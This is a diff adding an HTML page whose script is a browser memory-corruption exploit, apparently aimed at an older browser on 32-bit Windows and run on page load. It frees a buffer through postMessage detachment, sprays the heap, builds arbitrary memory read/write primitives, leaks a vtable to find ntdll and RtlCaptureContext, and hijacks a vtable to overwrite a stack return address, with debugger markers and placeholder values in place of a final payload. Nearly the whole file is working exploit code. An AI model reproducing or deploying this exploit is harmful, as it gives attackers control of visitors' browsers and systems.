@@ -1,0 +1,183 @@
+<html>
+	<body>
+		<script>
+		var arr = new Array(0x200000);
+		var ab2 = new ArrayBuffer(0x1337);
+		function sprayHeap() 
+		{
+			Math.atan2(0x111, "Starting heap sprayHeap");
+			for (var i = 0; i < arr.length; i++)
+			{
+				arr[i] = new Uint8Array(ab2);
+			}
+		}
+
+		function pwn() {
+			Math.atan2(0x111, "Starting");
+			Math.cos(1);
+			var ab = new ArrayBuffer(2123 * 1024);
+			Math.sin(1);
+			var ia = new Int8Array(ab);
+			
+			Math.atan2(0x111, "Detaching");
+			detach(ab);
+			setTimeout(main, 50, ia);
+
+
+			function detach(ab) {
+				postMessage("", "*", [ab]);
+			}
+
+			function ub(sb) {
+				return (sb < 0) ? sb + 0x100 : sb;
+			}
+
+			function setAddress(addr) {
+				ia[lengthIdx + 4] = addr & 0xFF;
+				ia[lengthIdx + 4 + 1] = (addr >> 8) & 0xFF;
+				ia[lengthIdx + 4 + 2] = (addr >> 16) & 0xFF;
+				ia[lengthIdx + 4 + 3] = (addr >> 24) & 0xFF;
+			}
+
+			function readDWORD(addr) {
+				setAddress(addr);
+				var ret = 0;
+				for( var i = 0; i < 4;  i++)
+				{
+					ret |= (mv[i] << (i * 8));
+				}
+				return ret;
+			}
+
+			function writeDWORD(addr, val) {
+				setAddress(addr);
+				for(var i = 0; i < 4; i ++)
+				{
+					mv[i] = (val >> (i * 8)) & 0xFF;
+				}
+			}
+
+			function findNtdll(vtable) {
+				var funcAddr = readDWORD(vtable + 0x10);
+				var index = 0;
+				var data = 0;
+				while(true)
+				{
+					data = readDWORD(funcAddr + index)
+					data = (data &0xFFFF)
+					if(data == 0x15FF)
+					{
+						data = readDWORD(funcAddr + index + 2);
+						break;
+					}
+					else
+					{
+						index++;
+					}
+				}
+				var ntdllAddr = readDWORD(data);
+				return ntdllAddr;
+			}
+
+			function findRtlCaptureContext(addr) {
+				var sum = 0;
+				var hash = -0x2f4d9962;
+				while(true)
+				{
+					sum = 0;
+					for(var i = 0; i < 12; i++)
+					{
+						data = readDWORD(addr + i * 4);
+						sum = (sum + data) & 0xFFFFFFFF;
+					}
+					if(sum == hash)
+					{
+						return addr;
+					}
+					else
+					{
+						addr++;
+					}
+				}
+				return;
+			}	
+
+			function main(ia) {
+				Math.atan2(0x111, "After detach");
+				sprayHeap();
+				Math.atan2(0x111, "After spray");
+
+				//Math.atan(1);
+				/*
+				ab allocated address plus i to find first case of 0x1337 tag, incease tag to 0x1338 then find it again from length parameter.
+				buffer is at offset +4 and vtable is at offset -0x1c
+				*/
+				for (var i = 0; ia[i] != 0x37 || ia[i+1] != 0x13 || ia[i+2] != 0x00 || ia[i+3] != 0x00 ;i++)
+				{
+					if(ia[i] === undefined)
+					{
+						Math.atan2(0x111, "Hmm");
+						return;
+					}
+				}
+				Math.atan2(0x111, "Found a value");
+				ia[i]++
+				lengthIdx = i;
+				//alert("Index is: " + lengthIdx.toString(16));
+				try {
+					for(var i = 0; arr[i].length != 0x1338; i++);
+				} catch(e) {
+					return;
+				}
+
+				mv = arr[i];
+
+				var bufaddr = ub(ia[lengthIdx + 4]) | ub(ia[lengthIdx + 4 + 1]) << 8 | ub(ia[lengthIdx + 4 +2 ]) << 16 | ub(ia[lengthIdx + 4 +3]) << 24;
+				var vtable = ub(ia[lengthIdx - 0x1c]) | ub(ia[lengthIdx - 0x1c + 1]) << 8 | ub(ia[lengthIdx - 0x1c + 2]) << 16 | ub(ia[lengthIdx - 0x1c + 3]) << 24;
+
+				Math.atan2(0x111, "Got info leak");
+
+				var ntdllAddr = findNtdll(vtable)
+
+				Math.atan2(0x111, "Got ntdll address");
+
+				var RtlCaptureContextAddr = findRtlCaptureContext(ntdllAddr);
+
+				Math.atan2(0x111, "Found function pointer");
+
+				var vtaddr = bufaddr;
+				var envaddr = bufaddr + 0x200;
+
+				for (var i = 0; i < (0x188 / 4); i++)
+				{
+					writeDWORD(vtaddr + i * 4, readDWORD(vtable + i * 4));
+				}
+
+				Math.atan2(0x111, "Backed up vtable");
+	
+				writeDWORD(vtaddr + 0x7C, RtlCaptureContextAddr);
+
+				ia[lengthIdx - 0x1c] = (vtaddr >> 0) & 0xFF;
+				ia[lengthIdx - 0x1c + 1] = (vtaddr >> 8) & 0xFF;
+				ia[lengthIdx - 0x1c + 2] = (vtaddr >> 16) & 0xFF;
+				ia[lengthIdx - 0x1c + 3] = (vtaddr >> 24) & 0xFF;
+
+				Math.atan2(0x111, "Overwritten");
+				envaddr in mv;
+				Math.atan2(0x111, "context should be leaked now");
+
+				var stackAddr = readDWORD(envaddr + 0x9C);
+
+				writeDWORD(stackAddr + 0x40, 0x12345678);
+				writeDWORD(stackAddr + 0x44, 0xABCDEF00);
+				//overwrite current return addr
+				//alert("Just before overwrite");
+				writeDWORD(stackAddr + 0x34, 0x11111111); //overwrite retn of write primitive
+
+				Math.atan(1);
+			}
+		}
+		setTimeout(pwn, 50);
+		</script>
+	</body>
+</html>
